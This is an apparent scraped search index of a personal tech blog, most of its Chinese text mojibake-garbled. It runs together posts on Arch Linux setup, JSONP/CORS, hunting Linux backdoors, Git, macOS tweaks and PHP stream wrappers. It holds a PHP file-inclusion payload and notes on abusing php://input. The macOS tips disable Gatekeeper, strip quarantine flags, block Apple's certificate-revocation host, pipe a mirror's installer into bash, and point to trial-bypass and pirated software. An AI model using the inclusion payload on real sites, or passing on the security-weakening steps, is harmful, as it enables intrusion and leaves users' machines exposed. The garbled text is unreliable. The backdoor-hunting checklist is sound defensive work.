å¯¹å»ºç«‹çš„æ–°ç”¨æˆ·è¿›è¡Œsudoæƒé™ç»„çš„è®¾ç½®EDITOR=vim visudo# æ‰¾åˆ° # %wheel å›è½¦è¿™è¡Œï¼Œåˆ é™¤æ³¨é‡Š è®¾ç½®ç½‘ç»œ12345# ä½¿èƒ½ç³»ç»Ÿå¼€æœºå¯åŠ¨é¡¹systemctl enable --now NetworkManager# è®¾ç½®wifinmtui å®‰è£…yayæŠ€æœ¯|åˆçº§ï¼šå¦‚ä½•åœ¨ Arch Linux ä¸­å®‰è£… Yay AUR åŠ©æ‰‹yay æŒ‡å—: 2. ä»£ç†é—®é¢˜ 123456789101112131415cd /optsudo git clone https://aur.archlinux.org/yay.git# å¯»æ‰¾ç»„id resek4# æ›´æ”¹yayæ‰€æœ‰æƒsudo chown -R debugpoint:users ./yay# è¿›å…¥yayç›®å½•cd yayexport GO111MODULE=onexport GOPROXY=https://goproxy.cnmakepkg -si å®‰è£…æ˜¾å¡é©±åŠ¨1pacman -S xf86-video-amdgpu nvidia nvidia-utils Display Server1pacman -S xorg Display Manager1pacman -S sddm è®¾ç½®å¼€æœºå¯åŠ¨ 1systemctl enable sddm","link":"/2022/10/26/Arch%20Linux%20%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/"},{"title":"å…³äº JSONP åŠ CORS ç»•è¿‡åŒæºç­–ç•¥çš„åŸç†è§£é‡Š","text":"JSONP è·¨åŸŸ JSONP çš„å…¨åå«åš JSON Padding å…¶å‡ºç°çš„ç›®çš„ä¸æ˜¯ä¸ºäº†è§£å†³è·¨åŸŸé—®é¢˜ï¼Œè€Œæ˜¯åœ¨ HTML ä¸­çš„ Javascript è°ƒç”¨å‡ºç°çš„å†å²é—ç•™é—®é¢˜1&lt;script src=http://127.0.0.1/func.js?call=callfunc&gt;&lt;/script&gt; è¿™æ ·å½¢å¼çš„ src è¿œç¨‹è°ƒç”¨ï¼Œä¼šè‡ªåŠ¨ç»•è¿‡åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œç›´æ¥è®¿é—®è¿œç¨‹çš„ func.js æ–‡ä»¶ä¸­çš„ callfunc å‡½æ•°ï¼Œå¹¶ä¾› JS åœ¨åç»­è§£æä¸º JSON æ ¼å¼è¿›è¡Œè¿”å› è€Œä¹‹æ‰€ä»¥å« JSON Paddingï¼Œæ˜¯å› ä¸ºä¾‹å¦‚å¦‚ä¸‹çš„ç®€å•å®ç°ï¼Œè®¿é—®å®Œè¿œç«¯ JS æ–‡ä»¶ä¸­çš„ callfun å‡½æ•°åï¼ˆæˆ–ç§°ä¹‹ä¸º API åï¼‰ï¼Œè¿œç¨‹çš„å†…å®¹è¿”å›åˆ°è¯¥ HTML æ–‡ä»¶çš„æ ¼å¼ä¸ºä½¿ç”¨ JSON çš„æ•°æ®å°è£…ï¼ˆä¾‹å¦‚è¿™ç§æ ¼å¼ï¼šcallback({&quot;name&quot;:&quot;hax&quot;,&quot;gender&quot;:&quot;Male&quot;})ï¼‰ 1234567891011&lt;html&gt; &lt;body&gt; &lt;div&gt; receive &lt;span id=&quot;qwerty&quot;&gt; &lt;/span&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; function callfun(data) {document.getElementById('qwerty').innerHTML = data; } &lt;/script&gt; &lt;script src=&quot;http://127.0.0.1:10010/js?call=callfun&quot;&gt; &lt;/script&gt;&lt;/html&gt; CORS è·¨åŸŸCORS æ˜¯æœåŠ¡ç«¯çš„è·¨åŸŸè®¾ç½®ï¼Œå› ä¸ºåŒæºç­–ç•¥çš„åŸå› ï¼Œæµè§ˆå™¨ä¼šé™åˆ¶è·¨åŸŸçš„ HTTP è¯·æ±‚ï¼Œå½“è·¨åŸŸè®¿é—®å‘èµ·æ—¶ï¼Œæµè§ˆå™¨ä¼šä½¿ç”¨ OPTIONS æ–¹æ³•å‘èµ·ä¸€ä¸ªé¢„æ£€è¯·æ±‚ï¼ˆpreflight requestï¼‰ ï¼Œå¾…æœåŠ¡å™¨ç¡®è®¤å¯ä»¥è®¿é—®åï¼Œå†å‘é€å®é™…è·¨åŸŸè¯·æ±‚ã€‚ è·¨åŸŸè¯·æ±‚å¯èƒ½ä¼šç”¨åˆ°å¦‚ä¸‹ HEADER å¤´ï¼š origin é¢„æ£€è¯·æ±‚ï¼ˆæˆ–å®é™…è¯·æ±‚ï¼‰çš„åŸç«™åç§° Access-Control-Request-Method å‘Šè¯‰æœåŠ¡å™¨è·¨åŸŸè¯·æ±‚ä¼šç”¨åˆ°çš„æ–¹æ³• Access-Control-Request-Headers å‘Šè¯‰æœåŠ¡å™¨ä¼šå¸¦çš„ HEADER å¤´ è€Œå¦‚æœæœåŠ¡å™¨åŒæ„è·¨åŸŸï¼Œåˆ™ä¼šå‘å®¢æˆ·ç«¯å‘èµ·å¦‚ä¸‹è·¨åŸŸå“åº”ï¼š Access-Control-Allow-Origin ç”¨äºå“åº”é¢„æ£€è¯·æ±‚ï¼ŒæœåŠ¡å™¨å…è®¸è·¨åŸŸçš„ URI Access-Control-Allow-Methods ç”¨äºå“åº”é¢„æ£€è¯·æ±‚ï¼Œå®é™…è¯·æ±‚çš„å…è®¸çš„ HTTP æ–¹æ³• Access-Control-Allow-Headers ç”¨äºå“åº”é¢„æ£€è¯·æ±‚ï¼ŒæŒ‡æ˜å®é™…è¯·æ±‚å…è®¸æºå¸¦çš„ HEADER Access-Control-Expose-Headers æœåŠ¡ç«¯è‡ªå®šä¹‰çš„ HEADER åªæœ‰åœ¨è¿™é‡Œè®¾ç½®ï¼Œå®¢æˆ·ç«¯æ‰èƒ½æ­£å¸¸è®¿é—® Access-Control-Max-Age é¢„æ£€è¯·æ±‚çš„ç¼“å­˜æ—¶é—´ Access-Control-Allow-Credentials å¦‚æœè¯·æ±‚ä¸­æœ‰ credentials=true è€ŒæœåŠ¡ç«¯çš„è¿™ä¸ª HERDER å´æ²¡æœ‰è®¾ç½®ä¸º true çš„æ—¶å€™ï¼Œæµè§ˆå™¨æ˜¯ä¸ä¼šæŠŠæœåŠ¡å™¨è¿”å›çš„æ•°æ®å‘å›ç»™è¯·æ±‚è€…","link":"/2022/10/03/JSONP%E8%B7%A8%E5%9F%9F/"},{"title":"Linux å…³é”®æ–‡ä»¶å®‰å…¨æ€§æ’æŸ¥(çº¢è“å¯¹æŠ—)","text":"å¸¸ç”¨å·¥å…·åé—¨æ£€æµ‹å·¥å…· chkrootkit rkhunter ç³»ç»Ÿæ€¥æ•‘æ¢å¤ã€åé—¨åˆ†æå–è¯ LiveCD ç›‘æ§å’Œå‘Šè­¦ä»»æ„ç³»ç»Ÿæ–‡ä»¶çš„æ›´æ”¹ï¼ˆIDSï¼‰ Tripwire é…ç½®æ–‡ä»¶æ’æŸ¥Linux å¼€æœºè‡ªå¯![[LinuxæŠ€å·§#Linuxå¼€æœºè‡ªå¯åŠ¨]] ``/etc/fstab` ç£ç›˜è¢«æ‰‹åŠ¨æŒ‚è½½ä¹‹åéƒ½å¿…é¡»æŠŠæŒ‚è½½ä¿¡æ¯å†™å…¥/etc/fstab è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå¦åˆ™ä¸‹æ¬¡å¼€æœºå¯åŠ¨æ—¶ä»ç„¶éœ€è¦é‡æ–°æŒ‚è½½ã€‚ shell ç¯å¢ƒå˜é‡![[Linuxç¯å¢ƒå˜é‡]] å®šæ—¶ä»»åŠ¡ crontab![[LinuxåŸç”Ÿå‘½ä»¤#crontab]] SUID æ’æŸ¥![[SUIDåé—¨]] SSH åé—¨æ’æŸ¥rpm åŒ…å®Œæ•´æ€§æ ¡éªŒ12rpm -Vf 'type sshd' 'type ssh'//S = å¤§å° / M = æƒé™ / 5=MD5 / T=æ—¶é—´ / L=é“¾æ¥ è·å– sshd è¿›ç¨‹ pid å¹¶è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨1strace -o out.txt -ff -p pid è·å– ssh è¿›ç¨‹ pid ä¼ ç»™ strace è¿›è¡Œç›‘æ§12ps -ef | grep -vE 'sshd|grep' | grep ssh | awk '{print $2}' |xargsstrace -o out.txt -f -p 2&gt;&amp;1 é€šè¿‡æ–‡ä»¶æ“ä½œç‰¹å¾è·Ÿè¸ªåé—¨1grep open out.txt\\* | grep -e APPEND pam åé—¨æ’æŸ¥pam é…ç½®æ–‡ä»¶æ£€æŸ¥12stat /etc/pam.d/sshdcat /etc/pam.d/sshd so æ–‡ä»¶åŠ è½½æ’æŸ¥ so æ–‡ä»¶æ˜¯ Linux ä¸‹çš„ç¨‹åºå‡½æ•°åº“,å³ç¼–è¯‘å¥½çš„å¯ä»¥ä¾›å…¶ä»–ç¨‹åºä½¿ç”¨çš„ä»£ç å’Œæ•°æ® 12ps -ef |grep sshd |grep ptspmap pid |grep security sshd è¿›ç¨‹æ“ä½œè·Ÿè¸ª12strace -o out -ff -p pidcat out\\* |grep APPEND ssh å…¬é’¥æ’æŸ¥å…¬é’¥æ–‡ä»¶é…ç½® /etc/ssh/sshd\\_config æ˜¯ sshd çš„é…ç½®æ–‡ä»¶ 1grep AuthorizedKeysFile /etc/ssh/sshd\\_config å…¬é’¥æ–‡ä»¶æœç´¢1find / -name authorized\\_keys æ–‡ä»¶å±æ€§åŠå†…å®¹1stat authorized\\_keys é¢„åŠ è½½åé—¨æ’æŸ¥ç³»ç»Ÿç¯å¢ƒå˜é‡æ£€æŸ¥ LD\\_PRELOADï¼Œæ˜¯ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºåŠ¨æ€åº“çš„åŠ è½½ï¼ŒåŠ¨æ€åº“åŠ è½½çš„ä¼˜å…ˆçº§æœ€é«˜ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå…¶åŠ è½½é¡ºåºä¸º:LD\\_PRELOAD&gt;LD\\_LIBRARY\\_PATH&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/libå½“è°ƒç”¨ä¸€äº›å¤–éƒ¨åº“çš„å‡½æ•°æ—¶ï¼Œå¦‚æœé€šè¿‡åŠ¨æ€é“¾æ¥åº“ LD_PRELOAD é¢„åŠ è½½å¦ä¸€ä¸ªåŒåçš„å‡½æ•°ï¼Œå…¶ä½¿ç”¨çš„å°±æ˜¯ LD_PRELOAD ç”Ÿæˆçš„åº“æ–‡ä»¶ï¼Œè¿™æ ·å°±ä¼šé€ æˆåŠ«æŒã€‚è¿™ä¸ªåŠ«æŒå½“ç„¶é¦–å…ˆå¯ä»¥æƒ³åˆ°çš„æ˜¯[[ææƒ]]ï¼Œå…¶æ¬¡å…¶ä¹Ÿå¯ä»¥ç”¨äºè½¯ä»¶ç ´è§£å’ŒåŠŸèƒ½å¢åŠ ã€‚ 12echo $LD\\_PRELOADunset LD\\_PRELOAD ç»•è¿‡åé—¨ hook éšè—1cat /etc/ld.so.preload è·Ÿè¸ªæ–‡ä»¶ç³»ç»Ÿè°ƒç”¨12./strace -f -e trace=file /bin/catacess(&quot;/etc/ld.so.preload&quot;, R\\_OK) åé—¨é…ç½®æ–‡ä»¶æ¸…ç†12lsattr /etc/ld.so.preloadecho &gt; /etc/ld.so.preload strace åé—¨æ’æŸ¥ strace æ˜¯ä¸€ä¸ªå¯ç”¨äºè¯Šæ–­ã€è°ƒè¯•å’Œæ•™å­¦çš„ Linux ç”¨æˆ·ç©ºé—´è·Ÿè¸ªå™¨ã€‚æˆ‘ä»¬ç”¨å®ƒæ¥ç›‘æ§ç”¨æˆ·ç©ºé—´è¿›ç¨‹å’Œå†…æ ¸çš„äº¤äº’ï¼Œæ¯”å¦‚ç³»ç»Ÿè°ƒç”¨ã€ä¿¡å·ä¼ é€’ã€è¿›ç¨‹çŠ¶æ€å˜æ›´ç­‰ã€‚ ç³»ç»Ÿè¿›ç¨‹ç­›æŸ¥ è¿›ç¨‹åç§°ã€å‘½ä»¤å‚æ•° strace è·Ÿè¸ª12strace -o out.txt -ff -p pidè°ƒç”¨å†…æ ¸ptraceç‰¹æ€§æ¥å®ç°åŠŸèƒ½ alias å‘½ä»¤æ’æŸ¥module åé—¨æ’æŸ¥ä¸­é—´ä»¶é…ç½®æ’æŸ¥ æ§åˆ¶å™¨åŠæ¨¡å—åŠ è½½é…ç½® æ¨¡å—æ–‡ä»¶æ’æŸ¥ æ–‡ä»¶ä¿®æ”¹æ—¶é—´æ’åº strings evil.so |grep -e exec å·²åŠ è½½æ¨¡å—ç¡®è®¤pamp -q pid |grep auth å†…æ ¸åé—¨æ’æŸ¥é©±åŠ¨åŠ è½½12lsmod / modinfo / modprobe -lcat /proc/modules ç½‘ç»œå±‚æ’æŸ¥12æ­£å‘: nmap -sV -PN -T4 -p-åå‘ï¼štcpdump -i eth0 src host hostname -w send.cap ç³»ç»Ÿæ–‡ä»¶æ’æŸ¥12linux PE / LiveCD (Porteus)fdisk -l /mount /dev/mapper/VolGroup å¸¸è§ç›®å½•é©»ç•™æ–‡ä»¶åŠç›®å½•123/etc/crontab/etc/init.d/etc/rc.local éšè—æ–‡ä»¶åŠç›®å½•123/tmp/.evil/tmp/ ./ å¯å†™å¯æ‰§è¡Œæƒé™123/tmp/var/tmp/dev/shm","link":"/2021/05/11/Linux%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"},{"title":"GIT:A boon for open-source developers who need to collaborate on code.","text":"Local Git ConfigCreate the Encrypted connection Generate the SSH key1ssh-keygen -t rsa -C &quot;[Email on Github]&quot; Put the public key(.pub) to the GitHub settings Verify the connectionâ€™s available Initial the Git configuration12git config --global user.name &quot;name&quot; //ä½ çš„GitHubç™»é™†ågit config --global user.email &quot;123@126.com&quot; //ä½ çš„GitHubæ³¨å†Œé‚®ç®± (Optional) Git configurationsGit proxy settings12345678910# View all of the proxy settingsgit config --global https.proxy# Set the proxygit config --global http.proxy [http://127.0.0.1:1080](http://127.0.0.1:1080/)git config --global https.proxy [https://127.0.0.1:1080](https://127.0.0.1:1080/)# Cancel the proxy settingsgit config --global --unset http.proxygit config --global --unset https.proxy Ignore the files Add the filename which should be ignored to the .gitignore file. However, the filesâ€™ names will also be exposed in the .gitignore file. Therefore, if we want to ignore the files, we should add the file name(or the pathname) to the .git/info/exclude file. Normal developConcept Workflow If you want to upload some codes to Github, you need to create a repository on Github before you use the git commands below. 1234567891011121314# Simplist git upload flowgit initecho &quot;Something&quot; &gt;&gt; README.mdgit add README.mdgit commit -m &quot;something&quot;git remote add origin [ssh@your.repo]git branch -M main # -M specifies the branch is a main branchgit push -u origin main # -u makes the after git push no need to specify the specific remote address# View the git loggit log# View the git statusgit status Open Source software developing flowGit Flow git branch1234567891011# Checkout all of the branchesgit branch# Delte a branchgit branch -d [branch_name]# Switching the current branchgit checkout [branch_name]# Create a new branch and Switch to itgit checkout -b [branch_name] git commit1234# Add a commit about this changinggit commit &quot;[something]&quot;# Edit the added commit contents but hasn't pushed to the remotegit commit --amend git rebase12345# Rebase the current branch to the other branch's lastest versiongit rebase [branch_name]# If there's a conflict when you're branching, continue the operation(you should solve the conflict first)git rebase --continue git merge12345# Merge another branch's lastest version to the current branchgit merge [branch_name]# combine all of the commits to one commit, and merge it to the current branchgit merge --squash [branch_name] git revert12# Revert a single operation by commit_idgit revert [commit_id] git reset123456789# Reset your local git to a history pointgit reset [file]|[history point]git reset --soft [file]|[history point]git reset --mixed [file]|[history point] # Defalutgit reset --hard [file]|[history point]# Reset the local git to the previous version, every ^ means a previous versiongit reset HEAD^ git reset HEAD~1 git tag123456789101112131415# View all of the tagsgit tag -n# Use git log --decorate to confirm the tag's belonginggit log --decorate# Create a tag to a commit at your local gitgit tag [tag_name]# Create a tag containing the contentgit tag -am [content] [tag_name]# Push the tagsgit push origin --tags # Push all of the tagsgit push origin tag [tag_name] # Push a certain tag git restore12345# Recover a file but not adding to the stagegit restore [file_name] # or we can use &quot;git checkout [file_name]&quot;# Revoke the file adding from the stagegit restore --stage [file_name] git cherry-pick12# Merge another branch's certain commit to the current branchgit cherry-pick [commit_id]|[branch_name] TipsThe difference between merge/rebase/squash The common merge could lead to the situation If we use different parameters rather than the common one. --squash could combine all of the commits to be a single one, which makes the git timeline looks better. Use the rebase as possible as we can(except the public branch) Though the merge is more convenient to use, however, if we always use squash to merge the branches, the author of the main branch will be full of the name of the maintenance personnel merge should be used at the main branch, and rebase should be used at the feature branch The difference between revert/reset The public branch can not tolerate the â€œRollbackâ€ thing, therefore the public branch mustnâ€™t use the reset command. We can use the revert instead of it. revert will add a new commit when we use it to revoke an operation. When we use the reset command to roll back to the previous git point, it is necessary to use the push -f to force push our local git to the remote side. The remote git side can not tolerate any differences between the remote and the local git, so whether we use the reset or the rebase command, we should push -f.","link":"/2023/01/10/Git/"},{"title":"MacOS Custom Settings","text":"å‘½ä»¤è¡Œçœ‹æ˜Ÿæˆ˜1telnet towel.blinkenlights.nl Homebrewä¸‰æ¡å‘½ä»¤å®‰è£… Homebrew 1/bin/bash -c &quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)&quot; 1echo 'eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;' &gt;&gt; ~/.zprofile 1eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot; gitå½“è¿œç¨‹æœ‰ git çš„æ—¶å€™æœ¬åœ°åªéœ€è¦ 1234git config --global user.name &quot;ç”¨æˆ·å&quot;git config --global user.email &quot;é‚®ç®±&quot;ssh-keygen -t rsa -C &quot;é‚®ç®±&quot; å³å¯åœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ª .ssh å¯†é’¥æ–‡ä»¶ï¼Œå°† id_rsa.pub é‡Œçš„å†…å®¹å¤åˆ¶åˆ° github ä¸Šçš„ä¸ªäººè®¾ç½®é‡Œå°±è¡Œäº† PDå»è¿™ä¸ªé“¾æ¥å»å®‰è£… pdhttps://www.parallels.com/hk/products/desktop/welcome-trial/å»è¿™ä¸ªé“¾æ¥å»å®‰è£… pd runnerhttps://macwk.com/soft/pd-runner æ­£å¸¸å®‰è£…ä¸€ä¸ª pd ä¸Šçš„ win11ï¼Œç„¶åå½“æ‰“å¼€è¿™ä¸ªç³»ç»Ÿçš„æ—¶å€™ï¼Œpd ä¼šæç¤ºè®©ä½ æ³¨å†Œä½ æ­£å¸¸æ³¨å†Œï¼Œç„¶åä¼šè¿›å…¥è¯•ç”¨æœŸ è¿è¡Œ pd runnerï¼Œä»¥åç”¨ pd runner å¯åŠ¨ win11 å°±å¥½äº† officeå»ç™¾åº¦äº‘ç½‘ç›˜é‡Œè¾¹å»è£… mac çš„ officeâ€œmac ç‰ˆ Office2019_å…¼å®¹ M1 èŠ¯ç‰‡â€ ç­¾åéªŒè¯å¯¼è‡´ dock æ è·³ï¼ˆè½¯ä»¶å¯åŠ¨æ…¢ï¼‰å» /etc/hosts é‡Œæ›´æ”¹ hostsï¼ŒåŠ ä¸Šä¸€æ¡ä»¥é¿å…éªŒè¯ 1127.0.0.1 ocsp.apple.com å¿«æ·é”®æ˜¾ç¤ºéšè—æ–‡ä»¶Command+Shift+. æˆªå›¾åŠå½•å±Command+Shift+4/5 é¢„è§ˆ Preview.appåŸºç¡€ä½¿ç”¨åœ¨é¢„è§ˆä¸­å¯ä»¥è¿›è¡Œè£å‰ªï¼Œç»˜ç”»ï¼Œç­¾åï¼Œç§»åŠ¨è‡³å…¶ä»–è®¾å¤‡ç­‰ åœ¨é¢„è§ˆä¸­æŸ¥çœ‹æ ¼å¼åŒ– manual page ä¿¡æ¯åœ¨ç¯å¢ƒå˜é‡ä¸ŠåŠ ä¸Š 12.zshrcä¸­pdfman='func(){man -t $1|open -fa Preview.app};func' ä¹‹åä¾¿å¯ä»¥ä½¿ç”¨ pdfman ls æ¥ç”¨é¢„è§ˆæ¥å±•ç¤º ls çš„è¯¦ç»†ä¿¡æ¯äº† Option çš„ä½œç”¨æŸ¥çœ‹å„ç§ç¡¬ä»¶çš„è¯¦ç»†ä¿¡æ¯ä½¿ç”¨ Option+å·¦é”®å•å‡»wifiï¼Œè“ç‰™ï¼Œå¯ä»¥å±•ç¤ºå…¶ç¡¬ä»¶è¯¦ç»†ä¿¡æ¯ ç§»åŠ¨æ–‡ä»¶é™¤äº† Ctrl+c å Ctrl+Alt+v æ¥æ¸¸åŠ¨æ–‡ä»¶è¿˜å¯ä»¥åœ¨å¤åˆ¶åï¼Œåœ¨ç›®æ ‡æ–‡ä»¶å¤¹ä¸‹ï¼Œä½¿ç”¨ Option+å³é”®å•å‡» æ¥ç§»åŠ¨æ–‡ä»¶ åŒæ—¶å¼€å¤šçª—å£æ‰“å¼€æ–‡ä»¶å¤¹åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œå¤šé€‰å¤šä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶å Option+å³é”®å•å‡»ï¼Œç‚¹å‡»æ‰“å¼€å¤šä¸ªçª—å£å³å¯ 1/4 æ ¼éŸ³é‡ã€äº®åº¦è°ƒæ•´æŒ‰ä½ Shift+Option+éŸ³é‡è°ƒæ•´/äº®åº¦è°ƒæ•´ å¯ä»¥ 1/4 æ ¼çš„è°ƒæ•´éŸ³é‡ å¤šæ¨¡å¼ç¼©æ”¾çª—å£æŒ‰ä½ Option ç„¶åå°†é¼ æ ‡ç§»åŠ¨åˆ°ç»¿è‰²çš„ç¼©æ”¾æŒ‰é’®ä¸Šï¼Œå³å¯å±•ç¤ºä¸åŒæ¨¡å¼çš„ç¼©æ”¾é€‰æ‹© ç¨‹åºåä¸Šåœ¨ç¨‹åºåä¸Šé¢ Option+å³é”®å•å‡» å³å¯ éšè—å…¶ä»–åº”ç”¨ å¼ºåˆ¶é€€å‡ºåº”ç”¨ åœ¨æ‰“å¼€å¤šä»»åŠ¡ Dock çš„æ—¶å€™å¯ä»¥ç›´æ¥æŒ‰ä½ Option æ¥ç‚¹æ‰å¤šä¸ªæ¡Œé¢çš„ Xï¼Œä¸ç”¨æ¥å›æ™ƒåŠ¨äº† ä½¿ç”¨ jenv å¿«é€Ÿè¿›è¡Œ linux å¤šç‰ˆæœ¬ java é…ç½®12345678910111213141516171819# æŸ¥çœ‹å½“å‰å®‰è£…jdkè·¯å¾„/usr/libexec/java_home -V# å®‰è£…jenvbrew install jenv# åœ¨ç¯å¢ƒå˜é‡é‡Œè¾¹æ·»åŠ ä¸Šï¼ševal &quot;$(jenv init -)&quot;# æ·»åŠ ä¸åŒjdkç‰ˆæœ¬åˆ°jenvè·¯å¾„jenv add /Library/Java/JavaVirtualMachines/jdk-17.0.2.jdk/Contents/Homejenv add /Library/Java/JavaVirtualMachines/jdk-15.0.2.jdk/Contents/Home# æŸ¥çœ‹å½“å‰å·²é…ç½®åˆ°jenvçš„jdkç‰ˆæœ¬jenv versions# åˆ‡æ¢jdkç‰ˆæœ¬ï¼Œä¾‹å¦‚åˆ‡æ¢åˆ°jdk15jenv local 15 åŒå‡»ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨ Vim æ‰“å¼€ä½¿ç”¨çƒ­é”®çª—å£æ‰“å¼€1234567891011on run {input, parameters} tell application &quot;iTerm&quot; tell current window create tab with profile &quot;HK&quot; tell current session write text (&quot;nvim &quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot;; exit&quot;) end tell end tell display notification &quot;ğŸ‰&quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot; has been opened at the iTerm Hotkey window~&quot; end tellend run ä½¿ç”¨çª—å£æ‰“å¼€ä½¿ç”¨ Automator åˆ›å»ºä¸€ä¸ª AppleScript ï¼Œç„¶åå†™å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œä»¥åæ‰€æœ‰æƒ³è¦ç”¨ Vim æ‰“å¼€çš„æ–‡ä»¶å…¨éƒ¨ä½¿ç”¨è¿™ä¸ª Application æ‰“å¼€å°±è¡Œäº† 12345678910on run {input, parameters} tell application &quot;iTerm&quot; create window with default profile tell front window tell current session write text (&quot;nvim &quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot;; exit&quot;) end tell end tell end tellend run ä¸ä¼ è¾“è·¯å¾„ 12345678910on run {} tell application &quot;iTerm&quot; create window with default profile tell front window tell current session write text (&quot;nvim &quot; &amp; &quot;; exit&quot;) end tell end tell end tellend run å½“åº”ç”¨ä¸èƒ½å®‰è£…çš„æ—¶å€™å¼€å¯ä»»æ„æ¥æº1234å¼€å¯ä»»æ„æ¥æºsudo spctl --master-disable å…³é—­ä»»æ„æ¥æºsudo spctl --master-enable å½“åº”ç”¨ç¨‹åºæ˜¾ç¤ºæŸåçš„æ—¶å€™12sudo xattr -r -d com.apple.quarantine /Applications/YesPlayMusic.appåæ–¹çš„åº”ç”¨ç¨‹åºæ‰€åœ¨è·¯å¾„ å¼€å¯å‘½ä»¤è¡Œ sudo ä½¿ç”¨æŒ‡çº¹è§£é”12345678# Edit the /etc/pam.d/sudosudo vim /etc/pam.d/sudo# Append the below line to this file(It's best to put is to the top)auth sufficient pam_tid.so# Use :wq! to force save and quit:wq! If you want to unlock this with your Apple Watch, then go to the mac preferences to modify the setting. ä½¿ç”¨ Ctrl+Command è¿›è¡Œçª—å£æ‹–åŠ¨12345# enabledefaults write -g NSWindowShouldDragOnGesture -bool true# disabledefaults delete -g NSWindowShouldDragOnGesture https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english-no-swears.txt ä½¿ Mac ä¸Šåœ°å›¾å˜æˆä¸­æ–‡çš„ï¼ˆç³»ç»Ÿè‹±æ–‡çš„æƒ…å†µä¸‹ï¼‰123defaults write com.apple.Maps AppleLanguages '(zh-CN)'# åŒæ ·ï¼Œæˆ‘ä»¬çœ‹å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è¿›è¡Œé”®å€¼çš„è¯»å–# defaults read com.apple.Maps AppleLanguages æ›´æ”¹çš„ä½ç½®å³ä¸ºå¦‚ä¸‹è·¯å¾„ä¸­çš„ AppleLanguages é”®å€¼ 1/Users/resek4/Library/Containers/com.apple.Maps/Data/Library/Preferences/com.apple.Maps.plist æ›´å¤š Mac ä¸‹ defaults ç”¨æ³•è¯¦è§ï¼šé‡ç½® macOS ç¨‹åºåä»¥åŠ defaults å‘½ä»¤ç”¨æ³• - çŸ¥ä¹Menu Bar | macOS defaults","link":"/2022/08/04/MacOS%20Custom%20Settings/"},{"title":"è¯¦è§£ php å°è£…åè®®","text":"æ¦‚è¿°PHP: æ”¯æŒçš„åè®®å’Œå°è£…åè®® - Manual PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼ fopen()ã€ copy()ã€ file_exists() å’Œ filesize() çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ stream_wrapper_register() æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚ å„ä¸ªå°è£…åè®®æ˜¯å¦èƒ½ä½¿ç”¨å–å†³äº php.ini é‡Œ allow_url_include ä¸ allow_url_fopen çš„å‚æ•°è®¾ç½®æƒ…å†µã€‚ file:// åè®® å¯¹ php.ini ä¸­çš„ä¸¤ä¸ªå‚æ•°ä¸æ•æ„Ÿ ä¸€èˆ¬è®¿é—®æœ¬åœ°æ–‡ä»¶çš„æ—¶å€™ç”¨ï¼Œæœ€å¥½è·Ÿç»å¯¹è·¯å¾„ï¼ˆä¸ç„¶ä¼šåŸºäºè„šæœ¬æ‰€å­˜åœ¨çš„è·¯å¾„è¿›è¡Œæ£€ç´¢ï¼‰ 12# file:// ç»å¯¹è·¯å¾„index.php?file=file://D:\\ha\\haha\\hahaha.txt ç”šè‡³åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œä½¿ç”¨ç›´æ¥è·Ÿè¿œç«¯åœ°å€ä¹Ÿå¯ä»¥è§¦å‘æ–‡ä»¶åŒ…å«æ¼æ´ php:// åè®®php://input å¯ä»¥æŠŠ php://input php://output ç†è§£æˆé€šç”¨çš„ I/O æ•°æ®æµï¼Œè€Œè¿™ä¸ªæ•°æ®æµå°±åƒä¸€ä¸ªå †æ ˆï¼Œinputï¼Œoutput çš„ä¸œè¥¿å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™ç«‹åˆ»è¢«æ‰§è¡Œ åœ¨enctype=&quot;multipart/form-data&quot; çš„æ—¶å€™php://input æ˜¯æ— æ•ˆçš„ å¯¹ php.ini ä¸­çš„ allow_url_include å‚æ•°æ•æ„Ÿï¼Œéœ€è¦ä¸º on å…·ä½“åŸç† 123456&lt;!-- å®¢æˆ·ç«¯å°±æ˜¯æäº¤ä¸€ä¸ª POST è¡¨å• --&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; name: &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;tom&quot; /&gt;&lt;br /&gt; age:&lt;input type=&quot;text&quot; name=&quot;age&quot; value=&quot;22&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt; 123# æœåŠ¡å™¨ç«¯$content = file_get_contents(&quot;php://input&quot;);echo $content; //è¾“å‡ºname=tom&amp;age=22 å¦‚æœæˆ‘ä»¬ç¡®å®šäº†å­˜åœ¨æ–‡ä»¶åŒ…å«è¡Œä¸ºï¼Œä¸”æœ‰å¯èƒ½è¦åŒ…å«çš„æ–‡ä»¶åæ˜¯ç”±æˆ‘ä»¬çš„è¾“å…¥ç»è¿‡ file_get_contents 